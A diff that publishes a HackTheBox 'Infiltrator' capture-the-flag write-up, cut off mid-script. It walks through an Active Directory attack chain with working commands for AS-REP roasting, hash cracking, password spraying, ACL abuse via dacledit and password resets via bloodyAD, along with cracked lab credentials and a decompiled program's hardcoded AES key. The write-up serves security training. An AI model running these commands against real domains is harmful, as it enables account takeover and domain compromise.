@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="robots" content="noindex">
+    <meta name="robots" content="index, follow">
     <title>Infiltrator - Hexicon Archives</title>
     <link rel="icon" type="image/x-icon" sizes="500x500" href="../favicon.png">
     <link rel="stylesheet" href="../style.css">
     <link rel="canonical" href="https://hexphased.github.io/hexicon-archives/machines/Infiltrator.html" />
     <!-- Machine-specific metadata for SEO -->
-    <meta name="description" content="Restricted writeup for Infiltrator machine from HackTheBox - Insane difficulty level">
+    <meta name="description" content="Detailed writeup for Infiltrator machine from HackTheBox - Insane difficulty level">
     <meta name="keywords" content="HackTheBox, Infiltrator, Insane, CTF, writeup, cybersecurity, penetration testing, Hexicon">
 </head>
 <body>
@@ -59,16 +59,417 @@
         <h1 class="writeup-title">Infiltrator</h1>
         <div class="writeup-metadata">
             <span class="difficulty insane">Insane</span>
-            <span class="date">Active machine</span>
+            <span class="date">June 14, 2025</span>
         </div>
         
         <div class="writeup-container">
             <div class="writeup-body">
                 <!-- Machine-specific content goes here -->
-                <p><img alt="Infiltrator" src="../images/Infiltrator/pwned.png" /></p>
-<p>Infiltrator is an <strong>ACTIVE</strong> machine!</p>
-<p>This write-up will go live once Infiltrator retires.</p>
-<p>Please note that I’m following Hack The Box’s guidelines by not posting detailed solutions while the machine is still live.</p>
+                <p><img alt="pwned" src="../images/Infiltrator/pwned.png" /></p>
+<p>Infiltrator was an exceptional insane-difficulty Active Directory machine that showcased a complex multi-stage attack chain involving certificate abuse, application exploitation, and advanced persistence techniques.
+The initial foothold was gained through AS-REP roasting, where kerbrute enumeration revealed that l.clark had the NO-PREAUTH flag set, allowing extraction and cracking of their AS-REP hash to obtain the password "WAT?watismypass!".</p>
+<p>The attack progressed through sophisticated Active Directory privilege escalation using Descendant Object Takeover (DoT) attacks.
+With d.anderson's kerberos ticket (using the same cracked password), I leveraged GenericAll permissions over the Marketing Digital OU to gain FullControl with inheritance, allowing password changes for e.rodriguez.
+This enabled adding e.rodriguez to the Chiefs Marketing group, which had permissions to reset m.harris's password - a member of the Remote Management Users group.</p>
+<p>The pivot point came through exploiting Output Messenger, a corporate chat application running on multiple forwarded ports.
+Directory traversal attacks revealed credentials in uploaded images, while reverse engineering a .NET application exposed hardcoded AES encryption keys.
+A custom Python decryption script revealed the winrm_svc service account password, granting access to chat logs via API calls that contained o.martinez's credentials.
+Network forensics played a crucial role when analyzing PCAP files discovered in o.martinez's profile.
+Wireshark analysis revealed BitLocker recovery keys and authentication token changes, leading to RDP access as o.martinez with an updated password found in HTTP traffic.
+This granted access to a BitLocker-protected drive containing critical backup files.</p>
+<p>The final escalation involved extracting NTDS.DIT and registry hives from administrator backups, revealing the lan_management service account credentials.
+This account had permissions to read GMSA passwords for infiltrator_svc$, which had modify rights over certificate templates.
+By exploiting ESC4 to ESC1 certificate abuse - modifying the Infiltrator_Template to allow UPN specification - I requested an administrator certificate and used it for authentication, achieving full domain compromise and capturing the final flag.</p>
+<h1>User flag</h1>
+<p><img alt="nmap" src="../images/Infiltrator/nmap.png" /></p>
+<p>Nmap scan reveals that this machine is the DC, and that there is a website. I'll have a look at it.</p>
+<h2>Gaining access to d.anderson</h2>
+<p><img alt="users" src="../images/Infiltrator/users.png" /></p>
+<p>There are a few users listed there. I will take each of those and I'll forge them into an AD format(<code>m.harris</code> for example).</p>
+<div class="codehilite"><pre><span></span><code>k.turner
+a.walker 
+m.harris
+l.clark
+e.rodriguez
+d.anderson
+o.martinez
+</code></pre></div>
+
+<h3>Running kerbrute to confirm valid users</h3>
+<p>To confirm whether these users are valid without having a password, I will run kerbrute. It will also grab any AS-REP hashes it finds which I could crack with hashcat.</p>
+<p><code>./kerbrute_linux_amd64 userenum --dc 10.10.11.31 -d infiltrator.htb --hash-file hashout2 /home/kalin/Infiltrator/userlist --downgrade</code></p>
+<p><img alt="test" src="../images/Infiltrator/test.png" /></p>
+<p>L.clarke has the NO-PREAUTH flag set, and kerbrute gave back the AS-REP hash. I can now crack it with hashcat.</p>
+<p><code>hashcat -a 0 hashout2 /usr/share/wordlists/rockyou.txt</code></p>
+<p><img alt="crack" src="../images/Infiltrator/crack.png" /></p>
+<p><code>L.Clarke | WAT?watismypass!</code></p>
+<p>I can confirm that these credentials work by running netexec.</p>
+<p><code>nxc smb 10.10.11.31 -u l.clark -p 'WAT?watismypass!' --users</code></p>
+<p><img alt="confirm" src="../images/Infiltrator/confirm.png" /></p>
+<p>Besides confirming the credentials, this also uncovered an interesting string within K.turner's description field. I'll save it for later.</p>
+<h3>Password spray</h3>
+<p>Since I have two potential passwords now, I'll do some password spraying with netexec.</p>
+<p><code>nxc smb 10.10.11.31 -u userlist  -p passlist --continue-on-success</code></p>
+<p><img alt="passwordspray" src="../images/Infiltrator/passwordspray.png" /></p>
+<p>Nothing new, but those restricted accounts interest me. One of them may still have an identical password, but it won't be shown because of the restriction(NTLM auth disabled).</p>
+<p>Even though they are restricted, I can still request kerberos tickets with a valid password.</p>
+<p><img alt="kinit" src="../images/Infiltrator/kinit.png" /></p>
+<p><code>d.anderson | WAT?watismypass!</code></p>
+<h2>Bloodhound enumeration</h2>
+<p>Now would be a good time to utilize bloodhound and get an idea for a possible attack path.</p>
+<p><img alt="bh1" src="../images/Infiltrator/bh1.png" /></p>
+<p>Both D.Anderon and M.Harris are members of the protected users group. This means that NTLM authentication is disabled for them. I'll have to use kerberos tickets if I want to use them.</p>
+<p><img alt="bh2" src="../images/Infiltrator/bh2.png" /></p>
+<p>D.Anderson has GenericAll over the marketing digital OU.</p>
+<p><img alt="bh3" src="../images/Infiltrator/bh3.png" /></p>
+<p>And this OU contains the E.Rodriguez user. This means that D.Anderson can gain FullControl rights over E.Rodriguez via Descendant object Takeover targetting the OU.</p>
+<p><img alt="bh4" src="../images/Infiltrator/bh4.png" /></p>
+<p>E.Rodriguez can add themselves to the chiefs marketing group.</p>
+<p><img alt="bh" src="../images/Infiltrator/bh.png" /></p>
+<p>Everyone in that group can change the password of M.Harris.</p>
+<p><img alt="bh5" src="../images/Infiltrator/bh5.png" /></p>
+<p>And M.Harris is in the remote management users group, which usually permits remote connections onto the machine.</p>
+<p>From all this, I can devise a plan to get access to the infiltrator machine.</p>
+<ol>
+<li>
+<p>Use the D.Anderson kerberos ticket to escalate rights over the OU from GenericAll to FullControl with inheritance.</p>
+</li>
+<li>
+<p>Change password/add shadow credentials to E.Martinez and take over the account.</p>
+</li>
+<li>
+<p>Add E.Rodriguez to the chiefs marketing group.</p>
+</li>
+<li>
+<p>Use E.Rodriguez to change the password of M.Harris.</p>
+</li>
+<li>
+<p>Request a kerberos ticket as M.Harris using the new credentials.</p>
+</li>
+<li>
+<p>Remote into the machine as M.Harris.</p>
+</li>
+</ol>
+<h2>Taking over E.Rodriguez via Descendant object Takeover with the OU</h2>
+<p>I can perform a DoT attack by using impacket-dacledit. I'll write FullControl rights over the OU, adding the inheritance flag to apply the same rights to every object contained within that OU.</p>
+<p><code>impacket-dacledit -action 'write' -rights 'FullControl' -inheritance -principal 'd.anderson' -target-dn 'OU=MARKETING DIGITAL,DC=INFILTRATOR,DC=HTB' 'infiltrator.htb/d.anderson' -k -no-pass -dc-ip 10.10.11.31</code></p>
+<p><img alt="dacledit" src="../images/Infiltrator/dacledit.png" /></p>
+<p>After that, I can change the password of E.Rodriguez with bloodyad.</p>
+<p><code>bloodyAD -d infiltrator.htb  -k --dc-ip 10.10.11.31 --host dc01.infiltrator.htb set password e.rodriguez 'WAT?watismypass!'</code></p>
+<p><img alt="change" src="../images/Infiltrator/change.png" /></p>
+<h2>Changing the password of M.Harris</h2>
+<p>Now I can take over M.Harris. I'll start off by adding E.Rodriguez to the chiefs marketing group.</p>
+<p><code>bloodyAD -d infiltrator.htb -u e.rodriguez -p 'WAT?watismypass!' --dc-ip 10.10.11.31 --host dc01.infiltrator.htb add groupMember 'Chiefs Marketing' e.rodriguez</code></p>
+<p><img alt="addgroup" src="../images/Infiltrator/addgroup.png" /></p>
+<p>After that, I can change the password of M.Harris.</p>
+<p><code>bloodyAD -d infiltrator.htb -u e.rodriguez -p 'WAT?watismypass!' --dc-ip 10.10.11.31 --host dc01.infiltrator.htb set password m.harris 'WAT?watismypass!'</code></p>
+<p>And finally request a ticket.</p>
+<p><img alt="kinit2" src="../images/Infiltrator/kinit2.png" /></p>
+<p>I'll remote into the machine as M.Harris.</p>
+<p><img alt="user" src="../images/Infiltrator/user.png" /></p>
+<h1>Root flag</h1>
+<h2>Setting up Output Messenger</h2>
+<p>I found an interesting lead in the programdata directory.</p>
+<p><img alt="interesting" src="../images/Infiltrator/interesting.png" /></p>
+<p>This led me to the download page <code>https://www.outputmessenger.com/</code>. I'll download the client to try and connect to the server(I'm assuming it'll be on the box).</p>
+<p>Additionally, I also found a list of ports I should forward here <code>http://support.outputmessenger.com/connect-to-server-from-internet/</code>. I will use chisel for that.</p>
+<h2>Gaining OM access as M.Harris</h2>
+<p>After completing the installation and forwarding all the ports (14121-14126), I had a choice between using the app and connecting via the web.</p>
+<p><img alt="web" src="../images/Infiltrator/web.png" /></p>
+<p>I'll use the web version for now. I will use the credentials of K.Turner, trying the MessengerApp password I've seen earlier in netexec output.</p>
+<p>However, there wasn't anything interesting there. I began searching through other ports and found something at port 14126.</p>
+<p><img alt="14126" src="../images/Infiltrator/14126.png" /></p>
+<p>Clicking the output links redirects to a 404 page though, so I'll try fuzzing with ffuf to search for anything hidden.</p>
+<p><code>ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://127.0.0.1:14126/output/FUZZ</code></p>
+<p><img alt="ffuf" src="../images/Infiltrator/ffuf.png" /></p>
+<p>I checked the uploads directory, and followed new directories until I found an image.</p>
+<p><code>http://127.0.0.1:14126/output/uploads/1/wall/940/7c96d28148f90cc4bdf1168f57a13fe9.png</code></p>
+<p><img alt="credentials" src="../images/Infiltrator/credentials.png" /></p>
+<p><code>M.Harris | D3v3l0p3r_Pass@1337!</code></p>
+<p>I'm assuming that this will be M.Harris' OM pass, because I've gotten access to their domain account way earlier.</p>
+<p><img alt="harris" src="../images/Infiltrator/harris.png" /></p>
+<p>The login worked, and I managed to gain OM access as M.Harris.</p>
+<p>I found a conversation between M.Harris and the administrator.</p>
+<p><img alt="admin" src="../images/Infiltrator/admin.png" /></p>
+<p>I could not download this program through the web, so I started up the app and went to the same conversation.</p>
+<p>I'll download the program. Before that, I need to set a download folder within OM. Its as simple as going to settings -&gt; Other -&gt; Chat -&gt; Change -&gt; Reboot OM.</p>
+<h2>Analyzing the .NET program</h2>
+<p><img alt="dotnet" src="../images/Infiltrator/dotnet.png" /></p>
+<p>Since this is a .NET program, I'll use ILSpy to analyze it.</p>
+<p><img alt="ilspy" src="../images/Infiltrator/ilspy.png" /></p>
+<p>I can see two interesting things. Decryptor and LdapAPP classes.</p>
+<p><img alt="classlist" src="../images/Infiltrator/classlist.png" /></p>
+<div class="codehilite"><pre><span></span><code>#<span class="w"> </span><span class="nv">Decryptor</span>
+
+<span class="o">//</span><span class="w"> </span><span class="nv">Decryptor</span>
+<span class="nv">using</span><span class="w"> </span><span class="nv">System</span><span class="c1">;</span>
+<span class="nv">using</span><span class="w"> </span><span class="nv">System</span>.<span class="nv">IO</span><span class="c1">;</span>
+<span class="nv">using</span><span class="w"> </span><span class="nv">System</span>.<span class="nv">Security</span>.<span class="nv">Cryptography</span><span class="c1">;</span>
+<span class="nv">using</span><span class="w"> </span><span class="nv">System</span>.<span class="nv">Text</span><span class="c1">;</span>
+
+<span class="nv">public</span><span class="w"> </span><span class="nv">class</span><span class="w"> </span><span class="nv">Decryptor</span>
+{
+<span class="w">    </span><span class="nv">public</span><span class="w"> </span><span class="nv">static</span><span class="w"> </span><span class="nv">string</span><span class="w"> </span><span class="nv">DecryptString</span><span class="ss">(</span><span class="nv">string</span><span class="w"> </span><span class="nv">key</span>,<span class="w"> </span><span class="nv">string</span><span class="w"> </span><span class="nv">cipherText</span><span class="ss">)</span>
+<span class="w">    </span>{
+<span class="w">        </span><span class="nv">using</span><span class="w"> </span><span class="nv">Aes</span><span class="w"> </span><span class="nv">aes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">Aes</span>.<span class="nv">Create</span><span class="ss">()</span><span class="c1">;</span>
+<span class="w">        </span><span class="nv">aes</span>.<span class="nv">Key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">Encoding</span>.<span class="nv">UTF8</span>.<span class="nv">GetBytes</span><span class="ss">(</span><span class="nv">key</span><span class="ss">)</span><span class="c1">;</span>
+<span class="w">        </span><span class="nv">aes</span>.<span class="nv">IV</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">new</span><span class="w"> </span><span class="nv">byte</span>[<span class="mi">16</span>]<span class="c1">;</span>
+<span class="w">        </span><span class="nv">ICryptoTransform</span><span class="w"> </span><span class="nv">transform</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">aes</span>.<span class="nv">CreateDecryptor</span><span class="ss">(</span><span class="nv">aes</span>.<span class="nv">Key</span>,<span class="w"> </span><span class="nv">aes</span>.<span class="nv">IV</span><span class="ss">)</span><span class="c1">;</span>
+<span class="w">        </span><span class="nv">using</span><span class="w"> </span><span class="nv">MemoryStream</span><span class="w"> </span><span class="nv">stream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">new</span><span class="w"> </span><span class="nv">MemoryStream</span><span class="ss">(</span><span class="nv">Convert</span>.<span class="nv">FromBase64String</span><span class="ss">(</span><span class="nv">cipherText</span><span class="ss">))</span><span class="c1">;</span>
+<span class="w">        </span><span class="nv">using</span><span class="w"> </span><span class="nv">CryptoStream</span><span class="w"> </span><span class="nv">stream2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">new</span><span class="w"> </span><span class="nv">CryptoStream</span><span class="ss">(</span><span class="nv">stream</span>,<span class="w"> </span><span class="nv">transform</span>,<span class="w"> </span><span class="nv">CryptoStreamMode</span>.<span class="nv">Read</span><span class="ss">)</span><span class="c1">;</span>
+<span class="w">        </span><span class="nv">using</span><span class="w"> </span><span class="nv">StreamReader</span><span class="w"> </span><span class="nv">streamReader</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">new</span><span class="w"> </span><span class="nv">StreamReader</span><span class="ss">(</span><span class="nv">stream2</span><span class="ss">)</span><span class="c1">;</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nv">streamReader</span>.<span class="nv">ReadToEnd</span><span class="ss">()</span><span class="c1">;</span>
+<span class="w">    </span>}
+}
+</code></pre></div>
+
+<div class="codehilite"><pre><span></span><code><span class="err">#</span><span class="w"> </span><span class="n">LdapAPP</span>
+
+<span class="k">using</span><span class="w"> </span><span class="k">System</span><span class="p">;</span>
+<span class="k">using</span><span class="w"> </span><span class="k">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">;</span>
+
+<span class="n">internal</span><span class="w"> </span><span class="k">class</span><span class="w"> </span><span class="n">LdapApp</span>
+<span class="err">{</span>
+<span class="w">    </span><span class="n">private</span><span class="w"> </span><span class="k">static</span><span class="w"> </span><span class="n">void</span><span class="w"> </span><span class="n">Main</span><span class="p">(</span><span class="n">string</span><span class="err">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span>
+<span class="w">    </span><span class="err">{</span>
+<span class="w">        </span><span class="o">//</span><span class="nl">IL_0129</span><span class="p">:</span><span class="w"> </span><span class="k">Unknown</span><span class="w"> </span><span class="k">result</span><span class="w"> </span><span class="n">type</span><span class="w"> </span><span class="p">(</span><span class="n">might</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">due</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">invalid</span><span class="w"> </span><span class="n">IL</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="n">missing</span><span class="w"> </span><span class="k">references</span><span class="p">)</span>
+<span class="w">        </span><span class="o">//</span><span class="nl">IL_0130</span><span class="p">:</span><span class="w"> </span><span class="n">Expected</span><span class="w"> </span><span class="n">O</span><span class="p">,</span><span class="w"> </span><span class="n">but</span><span class="w"> </span><span class="n">got</span><span class="w"> </span><span class="k">Unknown</span>
+<span class="w">        </span><span class="o">//</span><span class="nl">IL_013c</span><span class="p">:</span><span class="w"> </span><span class="k">Unknown</span><span class="w"> </span><span class="k">result</span><span class="w"> </span><span class="n">type</span><span class="w"> </span><span class="p">(</span><span class="n">might</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">due</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">invalid</span><span class="w"> </span><span class="n">IL</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="n">missing</span><span class="w"> </span><span class="k">references</span><span class="p">)</span>
+<span class="w">        </span><span class="o">//</span><span class="nl">IL_0143</span><span class="p">:</span><span class="w"> </span><span class="n">Expected</span><span class="w"> </span><span class="n">O</span><span class="p">,</span><span class="w"> </span><span class="n">but</span><span class="w"> </span><span class="n">got</span><span class="w"> </span><span class="k">Unknown</span>
+<span class="w">        </span><span class="n">string</span><span class="w"> </span><span class="nc">text</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ss">&quot;LDAP://dc01.infiltrator.htb&quot;</span><span class="p">;</span>
+<span class="w">        </span><span class="n">string</span><span class="w"> </span><span class="n">text2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ss">&quot;&quot;</span><span class="p">;</span>
+<span class="w">        </span><span class="n">string</span><span class="w"> </span><span class="n">text3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ss">&quot;&quot;</span><span class="p">;</span>
+<span class="w">        </span><span class="n">string</span><span class="w"> </span><span class="n">text4</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ss">&quot;&quot;</span><span class="p">;</span>
+<span class="w">        </span><span class="n">string</span><span class="w"> </span><span class="n">text5</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ss">&quot;winrm_svc&quot;</span><span class="p">;</span>
+<span class="w">        </span><span class="n">string</span><span class="w"> </span><span class="n">cipherText</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ss">&quot;TGlu22oo8GIHRkJBBpZ1nQ/x6l36MVj3Ukv4Hw86qGE=&quot;</span><span class="p">;</span>
+<span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="nc">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">args</span><span class="p">.</span><span class="n">Length</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mi">2</span><span class="p">)</span>
+<span class="w">        </span><span class="err">{</span>
+<span class="w">            </span><span class="n">switch</span><span class="w"> </span><span class="p">(</span><span class="n">args</span><span class="o">[</span><span class="n">i</span><span class="o">]</span><span class="p">.</span><span class="n">ToLower</span><span class="p">())</span>
+<span class="w">            </span><span class="err">{</span>
+<span class="w">            </span><span class="k">case</span><span class="w"> </span><span class="ss">&quot;-u&quot;</span><span class="err">:</span>
+<span class="w">                </span><span class="n">text2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">args</span><span class="o">[</span><span class="n">i + 1</span><span class="o">]</span><span class="p">;</span>
+<span class="w">                </span><span class="k">break</span><span class="p">;</span>
+<span class="w">            </span><span class="k">case</span><span class="w"> </span><span class="ss">&quot;-p&quot;</span><span class="err">:</span>
+<span class="w">                </span><span class="n">text3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">args</span><span class="o">[</span><span class="n">i + 1</span><span class="o">]</span><span class="p">;</span>
+<span class="w">                </span><span class="k">break</span><span class="p">;</span>
+<span class="w">            </span><span class="k">case</span><span class="w"> </span><span class="ss">&quot;-s&quot;</span><span class="err">:</span>
+<span class="w">                </span><span class="n">text4</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">args</span><span class="o">[</span><span class="n">i + 1</span><span class="o">]</span><span class="p">;</span>
+<span class="w">                </span><span class="k">break</span><span class="p">;</span>
+<span class="w">            </span><span class="k">case</span><span class="w"> </span><span class="ss">&quot;-default&quot;</span><span class="err">:</span>
+<span class="w">                </span><span class="n">text2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">text5</span><span class="p">;</span>
+<span class="w">                </span><span class="n">text3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Decryptor</span><span class="p">.</span><span class="n">DecryptString</span><span class="p">(</span><span class="ss">&quot;b14ca5898a4e4133bbce2ea2315a1916&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">cipherText</span><span class="p">);</span>
+<span class="w">                </span><span class="k">break</span><span class="p">;</span>
+<span class="w">            </span><span class="k">default</span><span class="err">:</span>
+<span class="w">                </span><span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="err">$</span><span class="ss">&quot;Invalid argument: {args[i]}&quot;</span><span class="p">);</span>
+<span class="w">                </span><span class="k">return</span><span class="p">;</span>
+<span class="w">            </span><span class="err">}</span>
+<span class="w">        </span><span class="err">}</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">string</span><span class="p">.</span><span class="n">IsNullOrEmpty</span><span class="p">(</span><span class="n">text2</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">string</span><span class="p">.</span><span class="n">IsNullOrEmpty</span><span class="p">(</span><span class="n">text3</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">string</span><span class="p">.</span><span class="n">IsNullOrEmpty</span><span class="p">(</span><span class="n">text4</span><span class="p">))</span>
+<span class="w">        </span><span class="err">{</span>
+<span class="w">            </span><span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="ss">&quot;Usage: UserExplorer.exe -u &lt;username&gt; -p &lt;password&gt;  -s &lt;searchedUsername&gt; [-default]&quot;</span><span class="p">);</span>
+<span class="w">            </span><span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="ss">&quot;To use the default credentials: UserExplorer.exe -default -s userToSearch&quot;</span><span class="p">);</span>
+<span class="w">            </span><span class="k">return</span><span class="p">;</span>
+<span class="w">        </span><span class="err">}</span>
+<span class="w">        </span><span class="k">try</span>
+<span class="w">        </span><span class="err">{</span>
+<span class="w">            </span><span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="ss">&quot;Attempting Service Connection...&quot;</span><span class="p">);</span>
+<span class="w">            </span><span class="n">DirectoryEntry</span><span class="w"> </span><span class="n">val</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">DirectoryEntry</span><span class="p">(</span><span class="nc">text</span><span class="p">,</span><span class="w"> </span><span class="n">text2</span><span class="p">,</span><span class="w"> </span><span class="n">text3</span><span class="p">);</span>
+<span class="w">            </span><span class="k">try</span>
+<span class="w">            </span><span class="err">{</span>
+<span class="w">                </span><span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="ss">&quot;Service Connection Successful.&quot;</span><span class="p">);</span>
+<span class="w">                </span><span class="n">DirectorySearcher</span><span class="w"> </span><span class="n">val2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">DirectorySearcher</span><span class="p">(</span><span class="n">val</span><span class="p">);</span>
+<span class="w">                </span><span class="k">try</span>
+<span class="w">                </span><span class="err">{</span>
+<span class="w">                    </span><span class="n">val2</span><span class="p">.</span><span class="n">set_Filter</span><span class="p">(</span><span class="err">$</span><span class="ss">&quot;(SAMAccountName={text4})&quot;</span><span class="p">);</span>
+<span class="w">                    </span><span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="err">$</span><span class="ss">&quot;Search for {text4} user...&quot;</span><span class="p">);</span>
+<span class="w">                    </span><span class="n">SearchResult</span><span class="w"> </span><span class="n">val3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">val2</span><span class="p">.</span><span class="n">FindOne</span><span class="p">();</span>
+<span class="w">                    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">val3</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="k">null</span><span class="p">)</span>
+<span class="w">                    </span><span class="err">{</span>
+<span class="w">                        </span><span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="ss">&quot;User found. Details:&quot;</span><span class="p">);</span>
+<span class="w">                        </span><span class="n">DirectoryEntry</span><span class="w"> </span><span class="n">directoryEntry</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">val3</span><span class="p">.</span><span class="n">GetDirectoryEntry</span><span class="p">();</span>
+<span class="w">                        </span><span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="n">string</span><span class="p">.</span><span class="nf">Format</span><span class="p">(</span><span class="ss">&quot;Name: {0}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">directoryEntry</span><span class="p">.</span><span class="n">get_Properties</span><span class="p">().</span><span class="n">get_Item</span><span class="p">(</span><span class="ss">&quot;cn&quot;</span><span class="p">).</span><span class="n">get_Value</span><span class="p">()));</span>
+<span class="w">                        </span><span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="n">string</span><span class="p">.</span><span class="nf">Format</span><span class="p">(</span><span class="ss">&quot;EmailID: {0}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">directoryEntry</span><span class="p">.</span><span class="n">get_Properties</span><span class="p">().</span><span class="n">get_Item</span><span class="p">(</span><span class="ss">&quot;mail&quot;</span><span class="p">).</span><span class="n">get_Value</span><span class="p">()));</span>
+<span class="w">                        </span><span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="n">string</span><span class="p">.</span><span class="nf">Format</span><span class="p">(</span><span class="ss">&quot;Telephone Extension: {0}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">directoryEntry</span><span class="p">.</span><span class="n">get_Properties</span><span class="p">().</span><span class="n">get_Item</span><span class="p">(</span><span class="ss">&quot;telephoneNumber&quot;</span><span class="p">).</span><span class="n">get_Value</span><span class="p">()));</span>
+<span class="w">                        </span><span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="n">string</span><span class="p">.</span><span class="nf">Format</span><span class="p">(</span><span class="ss">&quot;Department: {0}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">directoryEntry</span><span class="p">.</span><span class="n">get_Properties</span><span class="p">().</span><span class="n">get_Item</span><span class="p">(</span><span class="ss">&quot;department&quot;</span><span class="p">).</span><span class="n">get_Value</span><span class="p">()));</span>
+<span class="w">                        </span><span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="n">string</span><span class="p">.</span><span class="nf">Format</span><span class="p">(</span><span class="ss">&quot;Job Title: {0}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">directoryEntry</span><span class="p">.</span><span class="n">get_Properties</span><span class="p">().</span><span class="n">get_Item</span><span class="p">(</span><span class="ss">&quot;title&quot;</span><span class="p">).</span><span class="n">get_Value</span><span class="p">()));</span>
+<span class="w">                    </span><span class="err">}</span>
+<span class="w">                    </span><span class="k">else</span>
+<span class="w">                    </span><span class="err">{</span>
+<span class="w">                        </span><span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="ss">&quot;User not found.&quot;</span><span class="p">);</span>
+<span class="w">                    </span><span class="err">}</span>
+<span class="w">                </span><span class="err">}</span>
+<span class="w">                </span><span class="n">finally</span>
+<span class="w">                </span><span class="err">{</span>
+<span class="w">                    </span><span class="p">((</span><span class="n">IDisposable</span><span class="p">)</span><span class="n">val2</span><span class="p">)</span><span class="vm">?</span><span class="p">.</span><span class="n">Dispose</span><span class="p">();</span>
+<span class="w">                </span><span class="err">}</span>
+<span class="w">            </span><span class="err">}</span>
+<span class="w">            </span><span class="n">finally</span>
+<span class="w">            </span><span class="err">{</span>
+<span class="w">                </span><span class="p">((</span><span class="n">IDisposable</span><span class="p">)</span><span class="n">val</span><span class="p">)</span><span class="vm">?</span><span class="p">.</span><span class="n">Dispose</span><span class="p">();</span>
+<span class="w">            </span><span class="err">}</span>
+<span class="w">        </span><span class="err">}</span>
+<span class="w">        </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="k">Exception</span><span class="w"> </span><span class="n">ex</span><span class="p">)</span>
+<span class="w">        </span><span class="err">{</span>
+<span class="w">            </span><span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="err">$</span><span class="ss">&quot;An error occurred: {ex.Message}&quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="err">}</span>
+<span class="w">    </span><span class="err">}</span>
+<span class="err">}</span>
+</code></pre></div>
+
+<p>I can see an IV of 16(all zeros), and a hardcoded key/ciphertext.</p>
+<p>I have the encryption process in front of my eyes. I can craft a script to decrypt the password.</p>
+<p>The ciphertext is base64 encoded, so I'll decode it as well within the script.</p>
+<div class="codehilite"><pre><span></span><code><span class="c1"># Script</span>
+
+<span class="kn">import</span><span class="w"> </span><span class="nn">base64</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">Crypto.Cipher</span><span class="w"> </span><span class="kn">import</span><span class="w"> </span><span class="n">AES</span>
+
